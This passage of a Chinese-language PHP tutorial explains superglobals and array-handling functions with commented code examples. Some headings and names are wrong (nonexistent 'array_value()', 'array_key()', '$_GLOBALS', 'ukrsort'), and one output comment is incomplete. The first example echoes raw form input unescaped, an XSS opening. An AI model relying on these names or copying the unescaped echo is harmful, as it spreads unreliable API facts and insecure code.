表单域的名称为company --&gt;</span><br><span class="line">			地址：&lt;input type=&quot;text&quot; name=&quot;address&quot;&gt;&lt;br&gt;   &lt;!-- 表单域的名称为address --&gt;</span><br><span class="line">			电话：&lt;input type=&quot;text&quot; name=&quot;phone&quot;&gt;&lt;br&gt;     &lt;!-- 表单域的名称为phone --&gt;</span><br><span class="line">			EMAIL:&lt;input type=&quot;text&quot; name=&quot;email&quot;&gt;&lt;br&gt;     &lt;!-- 表单域的名称为email --&gt;</span><br><span class="line">			&lt;input type=&quot;submit&quot; value=&quot;添加新联系人&quot;&gt;</span><br><span class="line">		&lt;/form&gt;</span><br><span class="line">	&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">	echo &quot;用户添加的联系人信息如下：&lt;br&gt;&quot;;</span><br><span class="line">	foreach($_POST as $key =&gt; $value) &#123; 		  //使用foreach语句遍历超全局数组$_POST</span><br><span class="line">		echo $key.&apos; : &apos;.$value.&apos;&lt;br&gt;&apos;;     	  //输出$_POST数组中的键和值，键即是表单域的名称</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3><span id="request变量_request">request变量：$_REQUEST</span></h3><p>此关联数组包含\$_GET，\$_POST和\$_COOKIE中的全部内容。不管是POST还是GET方法提交的所有数据都可以通过\$_REQUEST获得。但是\$_REQUEST的速度比较慢。</p>
<h3><span id="http文件上传变量_files">HTTP文件上传变量：$_FILES</span></h3><p>使用表单的file输入域上传文件时，必须使用POST提交。</p>
<h3><span id="http-cookies_cookie">HTTP Cookies：$_COOKIE</span></h3><p>$_COOKIE超全局数组是经由HTTP Cookies方法提交至脚本的变量。</p>
<h3><span id="session变量_session">Session变量：$_SESSION</span></h3><p>在PHP5中，会话控制是在服务器端使用session跟踪用户。</p>
<h3><span id="global变量_globals">Global变量：$_GLOBALS</span></h3><p>GLOBALS是由所有已定义的全局变量组成的数组，变量名就是该数组的索引。</p>
<h2><span id="数组的相关处理函数">数组的相关处理函数</span></h2><h3><span id="数组的键值操作函数">数组的键/值操作函数</span></h3><p>在PHP中，数组的每个元素都是由键/值对组成，通过元素的键来访问对应键的值。</p>
<h4><span id="函数array_value">函数array_value()</span></h4><p>array_value()函数的作用是返回数组中所有元素的值。使用非常容易，只有一个必选参数，规定传入给定的数组，返回一个包含给定数组中所有值的数组。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$contact = array(&quot;ID&quot; =&gt; 1,</span><br><span class="line">		&quot;姓名&quot; =&gt; &quot;高某&quot;,</span><br><span class="line">		&quot;公司&quot; =&gt; &quot;A公司&quot;,</span><br><span class="line">		&quot;地址&quot; =&gt; &quot;北京市&quot;,</span><br><span class="line">		&quot;电话&quot; =&gt; &quot;(010)98765432&quot; );</span><br><span class="line">	</span><br><span class="line">	print_r(array_values($contact));   // array_values()函数传入数组$contact重新索引返回一个新数组</span><br><span class="line">	print_r($contact);                 //原数组$contact内容元素不变</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4><span id="函数array_key">函数array_key()</span></h4><p>array_key()函数的作用是返回数组所有的键名。本函数中有一个必需参数和两个可选参数，其中函数的原型如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array array_key(array input[,mixed search_value[,bool strict]])</span><br></pre></td></tr></table></figure></p>
<p>如果指定了可选参数search_value，则只返回指定该值的键名，否则input数组中的所有键名都会被返回，自PHP5起，可以用strict参数来进行全等比较。需要传入一个布尔型的值，FALSE为默认不依赖类型。如果传入TRUE值则根据类型返回带有指定值的键名。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">     $lamp=array(&quot;a&quot;=&gt;&quot;Linux&quot;,&quot;b&quot;=&gt;&quot;Apache&quot;,&quot;c&quot;=&gt;&quot;MySQL&quot;,&quot;d&quot;=&gt;&quot;PHP&quot;);  //只使第一个必需的参数</span><br><span class="line">	print_r(array_keys($lamp));            //输出：Array ( [0] =&gt; a [1] =&gt; b [2] =&gt; c )</span><br><span class="line">	print_r(array_keys($lamp,&quot;Apache&quot;));   //使用第二个可选参数输出：Array ( [0] =&gt; b)</span><br><span class="line"></span><br><span class="line">	$a=array(10,20,30,&quot;10&quot;);               //声明一个数组，其中元素的值有整数10和字符串”10”</span><br><span class="line">	print_r(array_keys($a,&quot;10&quot;,false));    //使用第三个参数 (false)输出：Array ( [0] =&gt; 0 [1] =&gt; 3 )</span><br><span class="line">	</span><br><span class="line">	$a=array(10,20,30,&quot;10&quot;);               //声明一个数组，其中元素的值有整数10和字符串”10”</span><br><span class="line">	print_r(array_keys($a,&quot;10&quot;,true));     //使用第三个参数 (true)输出：Array ( [0] =&gt; 3)	</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4><span id="函数in_array">函数in_array()</span></h4><p>in_array()函数的作用是检查数组中是否存在某个值，即在数组中搜索给定的值。本函数中有三个参数，前两个参数为必需的，最后一个参数为可选的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bool in_array(mixed needle,array haystack[,bool strict])</span><br></pre></td></tr></table></figure></p>
<p>第一个参数needle为规定要在数组中搜索的值，第二个参数haystack是规定要被搜索的数组，如果给定的值needle存在与数组haystack中则返回TRUE，函数只有在元素存在于数组且数据类型与给定相同时才返回TRUE。如果没有在数组中找到参数，函数返回FALSE。要注意如果needle参数是字符串，且strict参数设置为TRUE，则搜索区分大小写。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">        //in_array()函数的简单使用形式</span><br><span class="line">	$os = array(&quot;Mac&quot;, &quot;NT&quot;, &quot;Irix&quot;, &quot;Linux&quot;);</span><br><span class="line">		</span><br><span class="line">	if (in_array(&quot;Irix&quot;, $os)) &#123;       //这个条件成立，字符串Irix在数组$os中</span><br><span class="line">    		echo &quot;Got Irix&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">	if (in_array(&quot;mac&quot;, $os)) &#123;        //这个条件失败，因为 in_array()是区分大小写的</span><br><span class="line">    		echo &quot;Got mac&quot;;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	//in_array() 严格类型检查例子</span><br><span class="line">	$a = array(&apos;1.10&apos;, 12.4, 1.13);</span><br><span class="line"></span><br><span class="line">	if (in_array(&apos;12.4&apos;, $a, true)) &#123;  //第三个参数为true，所以字符串&apos;12.4&apos;和浮点数12.4类型不同</span><br><span class="line">		echo &quot;&apos;12.4&apos; found with strict check\n&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">	if (in_array(1.13, $a, true)) &#123;   //这个条件成立，执行下面的语句</span><br><span class="line">   		 echo &quot;1.13 found with strict check\n&quot;;</span><br><span class="line">	&#125; </span><br><span class="line"></span><br><span class="line">	//in_array()中还可以用数组当作第一个参数作为查询条件</span><br><span class="line">	$a = array(array(&apos;p&apos;, &apos;h&apos;), array(&apos;p&apos;, &apos;r&apos;), &apos;o&apos;);</span><br><span class="line"></span><br><span class="line">	if (in_array(array(&apos;p&apos;, &apos;h&apos;), $a)) &#123;   //数组array(&apos;p&apos;, &apos;h&apos;)在数组$a中存在</span><br><span class="line">  		  echo &quot;&apos;ph&apos; was found\n&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">	if (in_array(array(&apos;h&apos;, &apos;p&apos;), $a)) &#123;   //数组array(&apos;h&apos;, &apos;p&apos;)不存在数组$a中</span><br><span class="line">   		 echo &quot;&apos;hp&apos; was found\n&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>也可以使用array_search()函数进行检索。该函数与in_array()的参数相同，搜索给定的值存在则返回相应的键名，也支持对数据类型的严格判断。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$lamp=array(&quot;a&quot;=&gt;&quot;Linux&quot;,&quot;b&quot;=&gt;&quot;Apache&quot;,&quot;c&quot;=&gt;&quot;MySQL&quot;,&quot;d&quot;=&gt;&quot;PHP&quot;);  </span><br><span class="line">	echo array_search(&quot;PHP&quot;,$lamp);  //输出：d  （在数组$lamp中，存在字符串&quot;php&quot;则输出下标d）</span><br><span class="line"></span><br><span class="line">	$a=array(&quot;a&quot;=&gt;&quot;8&quot;,&quot;b&quot;=&gt;8,&quot;c&quot;=&gt;&quot;8&quot;);</span><br><span class="line">	echo array_search(8,$a,true);   //输出：b （严格按类型检索，整型8对应的下标为b）</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>使用array_key_exists()函数还可以检查给定的键名或者索引是否存在于数组中。因为一个数组中键名必须是唯一的，所以不需要对其数据类型进行判断。也可以使用isset()函数完成对数组中的键名或者索引进行检查，但isset()对数组中为NULL的值不会返回TRUE，而array_key_exists()会。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$search_array = array(&apos;first&apos; =&gt; 1, &apos;second&apos; =&gt; 4);     //声明一个关联数组，其中包含两个元素</span><br><span class="line">	</span><br><span class="line">	if (array_key_exists(&apos;first&apos;, $search_array)) &#123;         //检查下标为first对应的元素是否在数组中</span><br><span class="line">   		echo &quot;键名为&apos;first&apos;的元素在数组中&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	$search_array = array(&apos;first&apos; =&gt; null, &apos;second&apos; =&gt; 4);  //声明一个关联数组，第一个元素的值为NULL</span><br><span class="line"></span><br><span class="line">	isset($search_array[&apos;first&apos;]);                          //使用isset()函数检索下标为first的元素，返回false  </span><br><span class="line">	array_key_exists(&apos;first&apos;, $search_array);               //使用array_key_exists()检索下标为first的元素，返回true</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4><span id="函数array_flip">函数array_flip()</span></h4><p>array_flip()的作用是交换数组中的键和值。返回一个反转后的数组，如果同一值出现了多次，则最后一个键名将作为它的值，覆盖前面出现的元素。如果原数组中的值的数据类型不是字符串或者整数，函数将报错。该函数只有一个参数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array array_flip(array trans)</span><br></pre></td></tr></table></figure></p>
<p>参数是必需的，要求输入一个要处理的数组，返回该数组中每个元素的键和值交换后的数组。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$lamp=array(&quot;OS&quot;=&gt;&quot;Linux&quot;,&quot;WebServer&quot;=&gt;&quot;Apache&quot;,&quot;Database&quot;=&gt;&quot;MySQL&quot;, &quot;Language&quot;=&gt;&quot;PHP&quot;); </span><br><span class="line"></span><br><span class="line">	//输出：Array ( [Linux] =&gt; OS [Apache] =&gt; WebServer [MySQL] =&gt; Database [PHP] =&gt; Language )</span><br><span class="line">	print_r(array_flip($lamp));              //使用array_flip()函数交换数组中的键和值</span><br><span class="line"></span><br><span class="line"> 	//在数组中如果元素的值相同，则使用array_flip()会发生冲突</span><br><span class="line">	$trans = array(&quot;a&quot; =&gt; 1, &quot;b&quot; =&gt; 1, &quot;c&quot; =&gt; 2);</span><br><span class="line">	print_r(array_flip($trans));              //现在 $trans 变成了： Array( [1] =&gt; b [2] =&gt; c)</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4><span id="函数array_reverse">函数array_reverse()</span></h4><p>array_reverse()作用是将原数组中的元素顺序翻转，创建新的数组并返回。该函数有两个参数，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array array_reverse(array array[,bool preserve_keys])</span><br></pre></td></tr></table></figure></p>
<p>第一个参数是必需项，接受一个数组作为输入。第二个参数是可选项。如果指定为TURE，则元素的键名保持不变，否则键名将丢失。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$lamp=array(&quot;OS&quot;=&gt;&quot;Linux&quot;,&quot;WebServer&quot;=&gt;&quot;Apache&quot;,&quot;Database&quot;=&gt;&quot;MySQL&quot;, &quot;Language&quot;=&gt;&quot;PHP&quot;);</span><br><span class="line">	print_r(array_reverse($lamp));   //使用array_reverse()函数将数组$lamp中元素的顺序翻转</span><br><span class="line">	//输出结果Array ([Language]=&gt;PHP [Database]=&gt;MySQL [WebServer]=&gt;Apache [OS]=&gt;Linux) </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3><span id="统计数组元素的个数和唯一性">统计数组元素的个数和唯一性</span></h3><h4><span id="函数count">函数count()</span></h4><p>函数count()的作用是计算数组中的元素数目或对象中的属性个数。对于数组，返回其元素的个数，对于其他值则返回1。如果参数是变量而变量没有定义或是变量包含一个空的数组，该函数会返回0.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int count(mixed var[,int mode])</span><br></pre></td></tr></table></figure></p>
<p>其中第一个参数是必需的，传入要计数的数组或对象。第二个参数是可选的，规定函数的模式是否递归地计算多维数组中的数组的元素个数。可能的值是0和1，0是默认值，不检测多维数组，1则检测多维数组。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$lamp = array(&quot;Linux&quot;, &quot;Apache&quot;, &quot;MySQL&quot;, &quot;PHP&quot;);</span><br><span class="line">	echo count($lamp); //输出数组的个数为：4</span><br><span class="line">    </span><br><span class="line">        //声明一个二维数组，统计数组中元素的个数</span><br><span class="line">	$web= array(&apos;lamp&apos;  =&gt; array(&apos;Linux&apos;, &apos;Apache&apos;, &apos;MySQL&apos;,&apos;PHP&apos;),   </span><br><span class="line">                 &apos;j2ee&apos;  =&gt; array(&apos;Unix&apos;, &apos;Tomcat&apos;,&apos;Oracle&apos;,&apos;JSP&apos;));</span><br><span class="line"></span><br><span class="line">	echo count($web, 1);   //第二个参数的模式为1则计算多维数组的个数，输出10</span><br><span class="line">	echo count($web);     //默认模式为0，不计算多维数组的个数，输出2</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h4><span id="函数array_count_values">函数array_count_values()</span></h4><p>array_count_values()函数用于统计数组中所有值出现的次数。该函数只有一个参数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array array_count_values(array input)</span><br></pre></td></tr></table></figure></p>
<p>参数规定输入一个数组，返回一个数组，其元素的键名是原数组的值，键值是该值在原数组中出现的次数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$array = array(1, &quot;php&quot;, 1, &quot;mysql&quot;, &quot;php&quot;);     //声明一个带有重复值的数组</span><br><span class="line">	$newArray=array_count_values ($array);           //统计数组$array中所有值出现的次数</span><br><span class="line">	print_r($newArray);                              //输出：Array([1] =&gt; 2 [php] =&gt; 2 [mysql] =&gt; 1)</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4><span id="函数array_unique">函数array_unique()</span></h4><p>array_unique()函数用于删除数组中重复的值，并返回没有重复值的新数组。该函数只有一个参数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array array_unique(array array)</span><br></pre></td></tr></table></figure></p>
<p>参数需要接收一个数组，数组中几个元素的值相等时，只保留第一个元素，其他的元素被删除，并返回的新数组中键名不变。array_unique()先将值作为字符串排序，然后对每个值只保留第一个遇到的键名，接着忽略所有后面的键名。这并不意味着在未排序的array中同一个值的出现的键名会被保留。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$a=array(&quot;a&quot;=&gt;&quot;php&quot;,&quot;b&quot;=&gt;&quot;mysql&quot;,&quot;c&quot;=&gt;&quot;php&quot;);  //声明一个带有重复值的数组</span><br><span class="line">	print_r(array_unique($a));  		       //删除重复值后输出：Array ([a] =&gt; php [b] =&gt; mysql)</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h3><span id="使用回调函数处理数组的函数">使用回调函数处理数组的函数</span></h3><h4><span id="函数array_filter">函数array_filter()</span></h4><p>array_filter()函数用回调函数过滤数组中的元素，返回按用户自定义函数过滤后的新数组。<br>该函数的第一个参数是必选项，要求输入一个被过滤的数组。第二个参数是可选项，将用户自定义的函数名以字符串形式传入。如果自定义过滤函数返回true,则被操作的数组的当前值就会被包含在返回的结果数值中，并将结果组成一个新的数组。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	function myFun($var)&#123;      				 //自定义函数myFun，如果参数能被2整除则返回真</span><br><span class="line">		if($var % 2 == 0)</span><br><span class="line">			return true;</span><br><span class="line">	&#125;	</span><br><span class="line"></span><br><span class="line">	$array = array(&quot;a&quot;=&gt;1, &quot;b&quot;=&gt;2, &quot;c&quot;=&gt;3, &quot;d&quot;=&gt;4, &quot;e&quot;=&gt;5);  //声明值为整数序列的数组</span><br><span class="line">        //使用函数array_filter()将自定义的函数名以字符串的形式传给第二个参数</span><br><span class="line">	print_r(array_filter($array, &quot;myFun&quot;)); //过滤后的结果输出Array ( [b] =&gt; 2 [d] =&gt; 4 ) </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4><span id="函数array_walk">函数array_walk()</span></h4><p>array_walk()函数对数组中的每个元素应用回调函数处理。如果成功则返回TRUE，否则返回FLASE。<br>该函数的第一个参数是必选项，要求输入一个指定的回调函数处理的数组。第二个参数也是必选项，传入用户定义的回调函数，用于操作传入第一个参数的数组。array_walk()函数依次将第一个参数的数组中的每一个值传递到这个自定义的函数中。自定义的这个回调函数中应该接收两个参数，一次传入进来元素的值作为第一个参数，键名作为第二个参数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	function myFun1($value,$key) &#123;                   	//定义一个回调函数接收两个参数</span><br><span class="line">		echo &quot;The key $key has the value $value&lt;br&gt;&quot;;   //将参数连接在一超输出</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	$lamp=array(&quot;a&quot;=&gt;&quot;Linux&quot;,&quot;b&quot;=&gt;&quot;Apache&quot;,&quot;c&quot;=&gt;&quot;Mysql&quot;,&quot;d&quot;=&gt;&quot;PHP&quot;);  //定义一个数组$lamp</span><br><span class="line">	array_walk($lamp,&quot;myFun1&quot;);       				  //使用array_walk函数传入一个数组和一个回调函数</span><br><span class="line">	/*  执行后输出如下结果：</span><br><span class="line">	    The key a has the value Linux</span><br><span class="line">	    The key b has the value Apache</span><br><span class="line">	    The key c has the value MySQL</span><br><span class="line">	    The key d has the value PHP */</span><br><span class="line"></span><br><span class="line">	function myFun2($value,$key,$p)  &#123;        	  //自定义一个回调函数需要接受三个参数</span><br><span class="line">		echo &quot;$key $p $value &lt;br&gt;&quot;;               //将三个参数连接后输出</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	array_walk($lamp,&quot;myFun2&quot;,&quot;has the value&quot;);   	  //使用array_walk函数传入三个参数</span><br><span class="line">	/*执行后输出如下结果：	</span><br><span class="line">	  a has the value Linux </span><br><span class="line">	  b has the value Apache </span><br><span class="line">	  c has the value MySQL</span><br><span class="line">       d has the value PHP     */</span><br><span class="line"></span><br><span class="line">	function myFun3(&amp;$value,$key) &#123;      		//改变数组元素的值（请注意 &amp;$value传入引用）</span><br><span class="line">		$value=&quot;Web&quot;;                 		//将改变原数组中每个元素的值</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	array_walk($lamp,&quot;myFun3&quot;);   //使用array_walk函数传入两个参数，其中第一个参数为引用</span><br><span class="line">	print_r($lamp);               //输出：Array ( [a] =&gt; Web [b] =&gt; Web [c] =&gt; Web [d] =&gt; Web ) </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4><span id="函数array_map">函数array_map()</span></h4><p>array_map()函数可以处理多个数组，将回调函数作用到给定数组的元素上，返回用户自定义函数作用后的数组，array_map()是任意参数列表函数，回调函数接受的参数数目应该和传递给array_map()函数的数组数目一致。<br>该函数中的第一个参数是必选项，是用户自定义的回调函数的名称，或者是Null。第二个参数也是必选项，输入要处理的函数。也可以接着输入多个数组作为可选参数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	function myFun1($v) &#123;       //自定义一个函数作为回调函数，接收数组中每个元素做为参数</span><br><span class="line">		if ($v===&quot;MySQL&quot;) &#123;   //如果数组中元素的值恒等于MySQL条件成功</span><br><span class="line"> 			return &quot;Oracle&quot;;    //返回Oracle</span><br><span class="line">		&#125;</span><br><span class="line">		return $v;             //不等于MySQL的元素都返回传入的值，即原型返回</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	$lamp=array(&quot;Linux&quot;,&quot;Apache&quot;,&quot;MySQL&quot;,&quot;PHP&quot;);   //声明一个有4个元素的数组$lamp</span><br><span class="line">	</span><br><span class="line">	print_r(array_map(&quot;myFun1&quot;,$lamp));   //使用array_map()函数传入一个函数名和一个数组参数</span><br><span class="line">	/*上面程序执行后输出Array ( [0] =&gt; Linux [1] =&gt; Apache [2] =&gt; Oracle [3] =&gt; PHP ) */</span><br><span class="line">	</span><br><span class="line">	//使用多个参数, 回调函数接受的参数数目应该和传递给array_map()函数的数组数目一致</span><br><span class="line">	function myFun2($v1,$v2) &#123;   		  //自定义一个函数需要两个参数，两个数组中的元素依次传入</span><br><span class="line">		if ($v1===$v2) &#123;         	  //如果两个数组中的元素值相同则条件成功</span><br><span class="line">			return &quot;same&quot;;       	  //返回same, 说明两个数组中对应的元素值相同</span><br><span class="line">		&#125;</span><br><span class="line">		return &quot;different&quot;;         	  //如果两个数组中对应的元素值不同，返回different</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	$a1=array(&quot;Linux&quot;,&quot;PHP&quot;,&quot;MySQL&quot;);  	  //声明数组$a1,有三个元素</span><br><span class="line">	$a2=array(&quot;Unix&quot;,&quot;PHP&quot;,&quot;Oracle&quot;);    	  //数组$a第二个元素值和$a中第二个元素的值相同</span><br><span class="line">	</span><br><span class="line">	print_r(array_map(&quot;myFun2&quot;,$a1,$a2)); 	  //使用array_map()函数传入多个数组</span><br><span class="line">	/*上面程序执行后输出：Array ( [0] =&gt; different [1] =&gt; same [2] =&gt; different ) */</span><br><span class="line">	</span><br><span class="line">	//当自定义函数名设置为 null 时的情况</span><br><span class="line">	$a1=array(&quot;Linux&quot;,&quot;Apache&quot;);         	 //声明一个数组$a1, 有两个元素</span><br><span class="line">	$a2=array(&quot;MySQL&quot;,&quot;PHP&quot;);         	 //声明另一个数组$a2,也有两个元素</span><br><span class="line"></span><br><span class="line">	print_r(array_map(null,$a1,$a2));     	 //通过第一个参数设置为NULL，构造一个数组的数组</span><br><span class="line">	/*上面程序执行后输出：Array ( </span><br><span class="line">		[0] =&gt; Array ( [0] =&gt; Linux [1] =&gt; MySQL ) </span><br><span class="line">		[1] =&gt; Array ( [0] =&gt; Apache [1] =&gt; PHP ) ) */ </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3><span id="数组的排序函数">数组的排序函数</span></h3><table>
<thead>
<tr>
<th>排序函数</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>sort()</td>
<td style="text-align:left">按由小到大的升序对给定数组的值排序</td>
</tr>
<tr>
<td>rsort()</td>
<td style="text-align:left">对数组的元素按照键值进行由大到小的逆向排序</td>
</tr>
<tr>
<td>usort()</td>
<td style="text-align:left">使用用户自定义的回调函数对数组排序</td>
</tr>
<tr>
<td>asort()</td>
<td style="text-align:left">对数组进行由小到大排序并保持索引关系</td>
</tr>
<tr>
<td>uaort()</td>
<td style="text-align:left">使用用户自定义的比较回调函数对数组中的值进行排序并保持索引关联</td>
</tr>
<tr>
<td>ksort()</td>
<td style="text-align:left">按照键名对数组进行由小到大的排序，为数组值保留原来的键</td>
</tr>
<tr>
<td>krsort()</td>
<td style="text-align:left">将数组按照由大到小的键逆向排序，为数组值保留原来的键</td>
</tr>
<tr>
<td>ukrsort()</td>
<td style="text-align:left">使用用户自定义的比较回调函数对数组中的键名进行排序</td>
</tr>
<tr>
<td>natsort()</td>
<td style="text-align:left">用自然顺序算法对给定数组中的元素排序</td>
</tr>
<tr>
<td>natcasesort()</td>
<td style="text-align:left">用不区分大小写的自然顺序算法对给定数组中的元素排序</td>
</tr>
<tr>
<td>array_multisort()</td>
<td style="text-align:left">对多个数组或多维数组进行排序</td>
</tr>
</tbody>
</table>
<h4><span id="简单的数组排序函数">简单的数组排序函数</span></h4><p>这两个函数既可以按数字大小排列也可以按字母顺序排列，并具有相同的参数列表。其函数的原型分别如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bool sort(array $array[,int sort_flags])</span><br><span class="line">bool rsort(array $array[,int sort_flags])</span><br></pre></td></tr></table></figure></p>
<p>第一个参数是必需的，指定需要排序的数组。后一个参数是可选的，给出了排序的方式，可以用以下值改变排序的行为：</p>
<ul>
